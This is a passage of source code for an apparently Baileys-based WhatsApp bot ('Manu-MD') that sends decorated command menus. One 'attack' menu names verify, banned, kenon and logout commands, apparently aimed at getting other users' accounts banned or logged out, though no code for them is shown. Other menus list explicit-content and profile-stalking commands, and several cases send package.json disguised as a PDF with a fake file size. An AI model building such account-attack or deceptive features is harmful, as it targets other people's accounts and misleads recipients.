              }
           ],
          })
        })
    }
  }
}, {})

await sleep(500)
await Al.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
}, {quoted: m})

} else if (typeallmenu === 'v6') {
const uploadFile = { upload: Al.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: `${global.thumb}` },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "375984352103936",
          title: `Hai *${pushname}* 👋`,
          description: "Are You Want Script?",
          currencyCode: "LKR",
          priceAmount1000: "150000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: global.owner+"@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          from,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
        await Al.relayMessage(from, response.message, {
          messageId: response.key.id,
        });
        await Al.sendMessage(m.chat, {video: {url: gif}, gifPlayback: true, caption: capt}, { quoted: fkontak})
  }
}
break

case 'animemenu':
case 'randomanime':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let gif = `${global.gifin}`   
let anim = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＡＮＩＭＥ  ＲＡＮＤＯＭ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️akira
 │ ィ•  ${prefix}🌥️gichar
 │ ィ•  ${prefix}🌥️akiyama
 │ ィ•  ${prefix}🌥️ana
 │ ィ•  ${prefix}🌥️asuna
 │ ィ•  ${prefix}🌥️ayuzawa
 │ ィ•  ${prefix}🌥️boruto
 │ ィ•  ${prefix}🌥️chitanda
 │ ィ•  ${prefix}🌥️deidara
 │ ィ•  ${prefix}🌥️elaina
 │ ィ•  ${prefix}🌥️emilia
 │ ィ•  ${prefix}🌥️erza
 │ ィ•  ${prefix}🌥️fanart
 │ ィ•  ${prefix}🌥️genshin
 │ ィ•  ${prefix}🌥️gremory
 │ ィ•  ${prefix}🌥️hestia
 │ ィ•  ${prefix}🌥️hinata
 │ ィ•  ${prefix}🌥️husbu
 │ ィ•  ${prefix}🌥️icon
 │ ィ•  ${prefix}🌥️inori
 │ ィ•  ${prefix}🌥️isuzu
 │ ィ•  ${prefix}🌥️itachi
 │ ィ•  ${prefix}🌥️itori
 │ ィ•  ${prefix}🌥️kaga
 │ ィ•  ${prefix}🌥️kagura
 │ ィ•  ${prefix}🌥️kaguya
 │ ィ•  ${prefix}🌥️kakasih
 │ ィ•  ${prefix}🌥️kaneki
 │ ィ•  ${prefix}🌥️kaori
 │ ィ•  ${prefix}🌥️keneki
 │ ィ•  ${prefix}🌥️kosaki
 │ ィ•  ${prefix}🌥️kotori
 │ ィ•  ${prefix}🌥️kuriyama
 │ ィ•  ${prefix}🌥️kuroha
 │ ィ•  ${prefix}🌥️kurumi
 │ ィ•  ${prefix}🌥️loli
 │ ィ•  ${prefix}🌥️madara
 │ ィ•  ${prefix}🌥️megumin
 │ ィ•  ${prefix}🌥️menus
 │ ィ•  ${prefix}🌥️mikasa
 │ ィ•  ${prefix}🌥️miku
 │ ィ•  ${prefix}🌥️minato
 │ ィ•  ${prefix}🌥️naruto
 │ ィ•  ${prefix}🌥️natsukawa
 │ ィ•  ${prefix}🌥️nezuko
 │ ィ•  ${prefix}🌥️nishimiya
 │ ィ•  ${prefix}🌥️onepiece
 │ ィ•  ${prefix}🌥️pokemon
 │ ィ•  ${prefix}🌥️rem
 │ ィ•  ${prefix}🌥️rize
 │ ィ•  ${prefix}🌥️sagiri
 │ ィ•  ${prefix}🌥️sakura
 │ ィ•  ${prefix}🌥️sasuke
 │ ィ•  ${prefix}🌥️shina
 │ ィ•  ${prefix}🌥️shinka
 │ ィ•  ${prefix}🌥️shizuka
 │ ィ•  ${prefix}🌥️shota
 │ ィ•  ${prefix}🌥️simp
 │ ィ•  ${prefix}🌥️tomori
 │ ィ•  ${prefix}🌥️toukachan
 │ ィ•  ${prefix}🌥️tsunade
 │ ィ•  ${prefix}🌥️yatogami
 │ ィ•  ${prefix}🌥️yuki
 ╵`
await Al.sendMessage(m.chat, {video: {url: gif}, gifPlayback: true, caption: anim,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
}
break

case 'panelmenu':
case 'pterodactylmenu': case 'ramlist':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let panel =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＡＮＥＬ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️1gb
 │ ィ•  ${prefix}🌥️2gb
 │ ィ•  ${prefix}🌥️3gb
 │ ィ•  ${prefix}🌥️4gb
 │ ィ•  ${prefix}🌥️5gb
 │ ィ•  ${prefix}🌥️6gb
 │ ィ•  ${prefix}🌥️7gb
 │ ィ•  ${prefix}🌥️8gb
 │ ィ•  ${prefix}🌥️9gb
 │ ィ•  ${prefix}🌥️10gb
 │ ィ•  ${prefix}🌥️unli
 │ ィ•  ${prefix}🌥️crateadmin
 │ ィ•  ${prefix}🌥️listusr
 │ ィ•  ${prefix}🌥️listsrv
 │ ィ•  ${prefix}🌥️delusr
 │ ィ•  ${prefix}🌥️delsrv
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: panel,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'stcmenu': case 'stickermenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let stcr =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＣ  ＲＡＮＤＯＭ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️patrick 
 │ ィ•  ${prefix}🌥️doge
 │ ィ•  ${prefix}🌥️love
 │ ィ•  ${prefix}🌥️gura
 │ ィ•  ${prefix}🌥️paimon
 │ ィ•  ${prefix}🌥️mukelu
 │ ィ•  ${prefix}🌥️telestick
 │ ィ•  ${prefix}🌥️pucoyo
 │ ィ•  ${prefix}🌥️jomok
 │ ィ•  ${prefix}🌥️dino-kuning
 │ ィ•  ${prefix}🌥️upin
 │ ィ•  ${prefix}🌥️ipin
 │ ィ•  ${prefix}🌥️pororo
 │ ィ•  ${prefix}🌥️spongebob
 │ ィ•  ${prefix}🌥️random
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: stcr,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'asupanmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let asm =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＡＳＵＰＡＮ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️tobrut1
 │ ィ•  ${prefix}🌥️tobrut2
 │ ィ•  ${prefix}🌥️tobrut3
 │ ィ•  ${prefix}🌥️tobrut4
 │ ィ•  ${prefix}🌥️tobrut5
 │ ィ•  ${prefix}🌥️tobrut6
 │ ィ•  ${prefix}🌥️bokep
 │ ィ•  ${prefix}🌥️ometv
 │ ィ•  ${prefix}🌥️cosplay
 │ ィ•  ${prefix}🌥douyin
 │ ィ•  ${prefix}🌥️picre
 │ ィ•  ${prefix}🌥️danbooru
 │ ィ•  ${prefix}🌥️yandere
 │ ィ•  ${prefix}🌥️cecanindo
 │ ィ•  ${prefix}🌥️cecanchina
 │ ィ•  ${prefix}🌥️hijaber
 │ ィ•  ${prefix}🌥️yuli
 │ ィ•  ${prefix}🌥️paptt
 │ ィ•  ${prefix}🌥️china
 │ ィ•  ${prefix}🌥️hijab
 │ ィ•  ${prefix}🌥️indo
 │ ィ•  ${prefix}🌥️jepang
 │ ィ•  ${prefix}🌥️korea
 │ ィ•  ${prefix}🌥️malaysia
 │ ィ•  ${prefix}🌥️randomgirl
 │ ィ•  ${prefix}🌥️randomboy
 │ ィ•  ${prefix}🌥️thailand
 │ ィ•  ${prefix}🌥️vietnam
 │ ィ•  ${prefix}🌥️tiktokghea
 │ ィ•  ${prefix}🌥️tiktokbocil
 │ ィ•  ${prefix}🌥️tiktokkayes
 │ ィ•  ${prefix}🌥️tiktokpanrika
 │ ィ•  ${prefix}🌥️cosplayangel
 │ ィ•  ${prefix}🌥️videosad
 │ ィ•  ${prefix}🌥️videogalau
 │ ィ•  ${prefix}🌥️wibuvid
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: asm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'stalkmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let sm =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＡＬＫ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️igstalk
 │ ィ•  ${prefix}🌥️ttstalk
 │ ィ•  ${prefix}🌥️githubstalk
 │ ィ•  ${prefix}🌥️ffstalk
 │ ィ•  ${prefix}🌥️mlstalk
 │ ィ•  ${prefix}🌥️npmstalk
 │ ィ•  ${prefix}🌥️igstalk1
 │ ィ•  ${prefix}🌥️ttstalk1
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: sm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'attackmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let am =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＡＴＴＡＣＫ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️verify
 │ ィ•  ${prefix}🌥️banned
 │ ィ•  ${prefix}🌥️kenon
 │ ィ•  ${prefix}🌥️logout
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: am,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'privatemenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let pv = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＲＩＶＡＴ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️menfes
 │ ィ•  ${prefix}🌥️confes
 │ ィ•  ${prefix}🌥️balasmenfes
 │ ィ•  ${prefix}🌥️tolakmenfes
 │ ィ•  ${prefix}🌥️stopmenfes
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: pv,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'aimenu': case 'gptcmenu': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let ai =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＧＰＴＣ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️ai
 │ ィ•  ${prefix}🌥️gpt4o
 │ ィ•  ${prefix}🌥️chatgpt
 │ ィ•  ${prefix}🌥️cai
 │ ィ•  ${prefix}🌥️furina-ai
 │ ィ•  ${prefix}🌥️ai-img
 │ ィ•  ${prefix}🌥️simi
 │ ィ•  ${prefix}🌥️remini
 │ ィ•  ${prefix}🌥️google
 │ ィ•  ${prefix}🌥️lirik 
 │ ィ•  ${prefix}🌥️translate
 │ ィ•  ${prefix}🌥️listbahasa
 │ ィ•  ${prefix}🌥️removebg
 │ ィ•  ${prefix}🌥️toreal
 │ ィ•  ${prefix}🌥️lorasearch
 │ ィ•  ${prefix}🌥️tozombie
 │ ィ•  ${prefix}🌥️whatmusic
 │ ィ•  ${prefix}🌥️hdr
 │ ィ•  ${prefix}🌥️hd
 │ ィ•  ${prefix}🌥️hdvid
 │ ィ•  ${prefix}🌥️gimage
 │ ィ•  ${prefix}🌥️bingimg
 │ ィ•  ${prefix}🌥️dalle
 │ ィ•  ${prefix}🌥️wikimedia
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: ai,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'stickermenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let sr = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＣ  ＲＡＮＤＯＭ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️patrick
 │ ィ•  ${prefix}🌥️doge
 │ ィ•  ${prefix}🌥️love
 │ ィ•  ${prefix}🌥️gura
 │ ィ•  ${prefix}🌥️paimon
 │ ィ•  ${prefix}🌥️mukelu
 │ ィ•  ${prefix}🌥️telestick
 │ ィ•  ${prefix}🌥️pucoyo
 │ ィ•  ${prefix}🌥️jomok
 │ ィ•  ${prefix}🌥️dino-kuning
 │ ィ•  ${prefix}🌥️upin
 │ ィ•  ${prefix}🌥️ipin
 │ ィ•  ${prefix}🌥️pororo
 │ ィ•  ${prefix}🌥️spongebob
 │ ィ•  ${prefix}🌥️random
 ╵`
 await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: sr,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'gamesmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let gm = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  G A M E S  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️asahotak
 │ ィ•  ${prefix}🌥️caklontong
 │ ィ•  ${prefix}🌥️family100
 │ ィ•  ${prefix}🌥️kuis
 │ ィ•  ${prefix}🌥️math
 │ ィ•  ${prefix}🌥️siapakahaku
 │ ィ•  ${prefix}🌥️susunkata
 │ ィ•  ${prefix}🌥️tebakanime
 │ ィ•  ${prefix}🌥️tebakbendera
 │ ィ•  ${prefix}🌥️tebakgambar
 │ ィ•  ${prefix}🌥️tebakkalimat
 │ ィ•  ${prefix}🌥️tebakkata
 │ ィ•  ${prefix}🌥️tebakkimia
 │ ィ•  ${prefix}🌥️tebaklagu
 │ ィ•  ${prefix}🌥️tebaklirik
 │ ィ•  ${prefix}🌥️cekkhodam
 │╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: gm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 ??',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'primbonmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let pm = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＲＩＭＢＯＮ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️artinama
 │ ィ•  ${prefix}🌥️artimimpi
 │ ィ•  ${prefix}🌥️cocoknama
 │ ィ•  ${prefix}🌥️cocokpasangan
 │ ィ•  ${prefix}🌥️ramalanjodoh
 │ ィ•  ${prefix}🌥️jadiannikah
 │ ィ•  ${prefix}🌥️sifatusaha
 │ ィ•  ${prefix}🌥️rejeki
 │ ィ•  ${prefix}🌥️pekerjaan
 │ ィ•  ${prefix}🌥️ramalannasib
 │ ィ•  ${prefix}🌥️penyakit
 │ ィ•  ${prefix}🌥️shio
 │ ィ•  ${prefix}🌥️zodiak
 │ ィ•  ${prefix}🌥️memancing
 │ ィ•  ${prefix}🌥️masasubur
 │ ィ•  ${prefix}🌥️keberuntungan
 │ ィ•  ${prefix}🌥️sifat
 │ ィ•  ${prefix}🌥️weton
 │ ィ•  ${prefix}🌥️peruntungan
 │ ィ•  ${prefix}🌥️arahrejeki
 │ ィ•  ${prefix}🌥️nagahari
 │ ィ•  ${prefix}🌥️harinaas
 │ ィ•  ${prefix}🌥️harisangar
 │ ィ•  ${prefix}🌥️haribaik
 │ ィ•  ${prefix}🌥️fengshui
 │ ィ•  ${prefix}🌥️artitarot
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: pm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'quotesmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let qm = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＱＵＯＴＥＳ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️quotessad
 │ ィ•  ${prefix}🌥️quotesimage
 │ ィ•  ${prefix}🌥️quotesdilan
 │ ィ•  ${prefix}🌥️quotesislami
 │ ィ•  ${prefix}??️quotesjay
 │ ィ•  ${prefix}🌥️pantun
 │ ィ•  ${prefix}🌥️katabijak
 │ ィ•  ${prefix}🌥️motivasi
 │ ィ•  ${prefix}🌥️gombal
 │ ィ•  ${prefix}🌥️galau
 │ ィ•  ${prefix}🌥️bacot
 │ ィ•  ${prefix}🌥️pantun2
 │ ィ•  ${prefix}🌥️bucin
 │ ィ•  ${prefix}🌥️sindiran
 │ ィ•  ${prefix}🌥️qsenja
 │ ィ•  ${prefix}🌥️qfakta
 │ ィ•  ${prefix}🌥️qhacker
 │ ィ•  ${prefix}🌥️renungan
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: qm,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'voicemenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let vcc = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＶＯＩＣＥ  ＣＨＮＧＥＲ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️bass
 │ ィ•  ${prefix}🌥️blown
 │ ィ•  ${prefix}🌥️deep
 │ ィ•  ${prefix}🌥️earrape
 │ ィ•  ${prefix}🌥️fast
 │ ィ•  ${prefix}🌥️fat
 │ ィ•  ${prefix}🌥️nightcore
 │ ィ•  ${prefix}🌥️reverse
 │ ィ•  ${prefix}🌥️robot
 │ ィ•  ${prefix}🌥️slow
 │ ィ•  ${prefix}🌥️smooth
 │ ィ•  ${prefix}🌥️tupai
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: vcc,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "𝘾𝙝𝙖𝙣𝙚𝙡 𝙄𝙣𝙛𝙤 𝙈𝘼𝙉𝙐-𝙈𝘿 💙",
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
